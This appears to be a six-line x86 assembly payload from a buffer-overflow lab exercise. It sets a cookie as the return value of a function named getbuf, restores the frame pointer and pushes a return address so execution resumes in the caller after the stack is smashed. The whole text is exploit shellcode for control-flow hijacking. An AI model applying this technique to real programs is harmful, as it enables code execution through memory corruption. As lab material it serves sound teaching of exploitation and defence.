	movl $0x35c5d934, %eax #cookie is return value of getbuf
	movl %ebp, %edx
	leal  0x28(%esp), %edx #restore ebp
	movl %edx, %ebp
	push $0x8048bfa
	ret
